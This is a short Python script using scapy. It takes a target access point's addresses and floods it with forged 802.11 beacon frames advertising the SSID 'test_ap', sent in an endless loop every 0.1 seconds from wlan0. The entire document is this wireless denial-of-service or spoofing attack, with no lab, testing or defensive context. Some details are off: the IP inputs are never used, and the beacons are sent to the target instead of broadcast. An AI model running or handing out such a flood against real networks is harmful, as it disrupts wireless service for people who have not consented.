from scapy.all import *

# Prompt the user for input
target_ip = input("Enter the target IP address of the access point: ")
target_mac = input("Enter the target MAC address of the access point: ")
source_ip = input("Enter your source IP address: ")
source_mac = input("Enter your source MAC address: ")

# Craft a packet
packet = RadioTap()/Dot11(type=0, subtype=8, addr1=target_mac, addr2=source_mac, addr3=target_mac)/Dot11Beacon(cap='ESS+privacy')/Dot11Elt(ID='SSID', info='test_ap')/Dot11EltRates(rates=[130, 12, 96, 108, 24, 48, 72, 36])/Dot11Elt(ID='DSset', info='\x03')

# Send a large number of packets to the access point
sendp(packet, iface="wlan0", inter=0.1, loop=1)
